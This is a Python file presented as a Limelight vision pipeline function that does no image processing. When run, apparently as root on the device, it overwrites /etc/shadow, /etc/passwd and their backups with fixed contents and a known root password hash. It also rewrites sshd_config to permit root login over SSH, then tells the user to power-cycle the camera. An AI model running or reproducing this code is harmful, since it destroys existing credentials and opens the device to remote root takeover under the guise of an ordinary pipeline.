import numpy as np
import subprocess

# changes passwd to 7112
def runPipeline(image, llrobot):
    # bashCommand = "whoami"
    # output = subprocess.run(bashCommand, stdout=subprocess.PIPE)
    # print(output)
    # we are running on root
    
    etc_shadow = open("/etc/shadow", 'w')
    etc_shadow_ = open("/etc/shadow-", 'w')
    
    etc_shadow.write("root:$5$fpc1CceW/eKY83XR$kz3rjsL4cvUG5mA3CkLFDmJpU8cMh8bo8pJFPUTf966:::::::\ndaemon:*:::::::\nbin:*:::::::\nsys:*:::::::\nsync:*:::::::\nmail:*:::::::\nwww-data:*:::::::\noperator:*:::::::\nnobody:*:::::::\navahi:*:::::::\ndbus:*:::::::\ndhcpcd:*:::::::\npi:$5$007PZzxf4Qr$B0nRDpJcYeW1sa.0wicKXSC46KKYRXdXPBQdcUztYD2:::::::\nsshd:!*:18912::::::\n") 
    etc_shadow_.write("root:$5$fpc1CceW/eKY83XR$kz3rjsL4cvUG5mA3CkLFDmJpU8cMh8bo8pJFPUTf966:::::::\ndaemon:*:::::::\nbin:*:::::::\nsys:*:::::::\nsync:*:::::::\nmail:*:::::::\nwww-data:*:::::::\noperator:*:::::::\nnobody:*:::::::\navahi:*:::::::\ndbus:*:::::::\ndhcpcd:*:::::::\npi:$5$007PZzxf4Qr$B0nRDpJcYeW1sa.0wicKXSC46KKYRXdXPBQdcUztYD2:::::::\nsshd:!*:18912::::::\n") 
    
    # changing etc/shadow
    print("changed etc/shadow")
    
    
    etc_passwd = open("/etc/passwd", 'w')
    etc_passwd_ =  open("/etc/passwd-", 'w')
    
    etc_passwd.write("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/false\nbin:x:2:2:bin:/bin:/bin/false\nsys:x:3:3:sys:/dev:/bin/false\nsync:x:4:100:sync:/bin:/bin/sync\nmail:x:8:8:mail:/var/spool/mail:/bin/false\nwww-data:x:33:33:www-data:/var/www:/bin/false\noperator:x:37:37:Operator:/var:/bin/false\nnobody:x:65534:65534:nobody:/home:/bin/false\navahi:x:1000:1000::/:/bin/false\ndbus:x:1001:1001:DBus messagebus user:/run/dbus:/bin/false\ndhcpcd:x:1002:1002:dhcpcd user:/:/bin/false\npi:x:1003:1008:primary:/home/pi:/bin/sh\nsshd:x:998:998:SSH drop priv user:/root:/bin/bash")
    etc_passwd_.write("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/false\nbin:x:2:2:bin:/bin:/bin/false\nsys:x:3:3:sys:/dev:/bin/false\nsync:x:4:100:sync:/bin:/bin/sync\nmail:x:8:8:mail:/var/spool/mail:/bin/false\nwww-data:x:33:33:www-data:/var/www:/bin/false\noperator:x:37:37:Operator:/var:/bin/false\nnobody:x:65534:65534:nobody:/home:/bin/false\navahi:x:1000:1000::/:/bin/false\ndbus:x:1001:1001:DBus messagebus user:/run/dbus:/bin/false\ndhcpcd:x:1002:1002:dhcpcd user:/:/bin/false\npi:x:1003:1008:primary:/home/pi:/bin/sh\nsshd:x:998:998:SSH drop priv user:/root:/bin/bash")
    
    # changing etc/passwd
    print("changed etc/passwd")
    
    
    etc_ssh_sshd_config = open("/etc/ssh/sshd_config", 'w')
    
    etc_ssh_sshd_config.write("#	$OpenBSD: sshd_config,v 1.104 2021/07/02 05:11:21 dtucker Exp $\n\n# This is the sshd server system-wide configuration file.  See\n# sshd_config(5) for more information.\n\n# This sshd was compiled with PATH=/bin:/sbin:/usr/bin:/usr/sbin\n\n# The strategy used for options in the default sshd_config shipped with\n# OpenSSH is to specify options with their default value where\n# possible, but leave them commented.  Uncommented options override the\n# default value.\n\n#Port 22\n#AddressFamily any\n#ListenAddress 0.0.0.0\n#ListenAddress ::\n\n#HostKey /etc/ssh/ssh_host_rsa_key\n#HostKey /etc/ssh/ssh_host_ecdsa_key\n#HostKey /etc/ssh/ssh_host_ed25519_key\n\n# Ciphers and keying\n#RekeyLimit default none\n\n# Logging\n#SyslogFacility AUTH\n#LogLevel INFO\n\n# Authentication:\n\n#LoginGraceTime 2m\nPermitRootLogin yes\n#StrictModes yes\n#MaxAuthTries 6\n#MaxSessions 10\n\n#PubkeyAuthentication yes\n\n# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2\n# but this is overridden so installations will only check .ssh/authorized_keys\nAuthorizedKeysFile	.ssh/authorized_keys\n\n#AuthorizedPrincipalsFile none\n\n#AuthorizedKeysCommand none\n#AuthorizedKeysCommandUser nobody\n\n# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts\n#HostbasedAuthentication no\n# Change to yes if you don't trust ~/.ssh/known_hosts for\n# HostbasedAuthentication\n#IgnoreUserKnownHosts no\n# Don't read the user's ~/.rhosts and ~/.shosts files\n#IgnoreRhosts yes\n\n# To disable tunneled clear text passwords, change to no here!\n#PasswordAuthentication yes\n#PermitEmptyPasswords no\n\n# Change to no to disable s/key passwords\n#KbdInteractiveAuthentication yes\n\n# Kerberos options\n#KerberosAuthentication no\n#KerberosOrLocalPasswd yes\n#KerberosTicketCleanup yes\n#KerberosGetAFSToken no\n\n# GSSAPI options\n#GSSAPIAuthentication no\n#GSSAPICleanupCredentials yes\n\n# Set this to 'yes' to enable PAM authentication, account processing,\n# and session processing. If this is enabled, PAM authentication will\n# be allowed through the KbdInteractiveAuthentication and\n# PasswordAuthentication.  Depending on your PAM configuration,\n# PAM authentication via KbdInteractiveAuthentication may bypass\n# the setting of " + 'PermitRootLogin without-password' + ".\n# If you just want the PAM account and session checks to run without\n# PAM authentication, then enable this but set PasswordAuthentication\n# and KbdInteractiveAuthentication to 'no'.\nUsePAM yes\n\n#AllowAgentForwarding yes\n#AllowTcpForwarding yes\n#GatewayPorts no\n#X11Forwarding no\n#X11DisplayOffset 10\n#X11UseLocalhost yes\n#PermitTTY yes\n#PrintMotd yes\n#PrintLastLog yes\n#TCPKeepAlive yes\n#PermitUserEnvironment no\n#Compression delayed\n#ClientAliveInterval 0\n#ClientAliveCountMax 3\n#UseDNS no\n#PidFile /var/run/sshd.pid\n#MaxStartups 10:30:100\n#PermitTunnel no\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none\n\n# override default of no subsystems\nSubsystem	sftp	/usr/libexec/sftp-server\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs\n#	X11Forwarding no\n#	AllowTcpForwarding no\n#	PermitTTY no\n#	ForceCommand cvs server\n")
    #changing sshd_config
    print("changed sshd_config")
    
    
    print("\n\n\n**********************************************\n" + 
          "now turn the limelight completely off and turn it on again")
    
    
    
    return None, None, None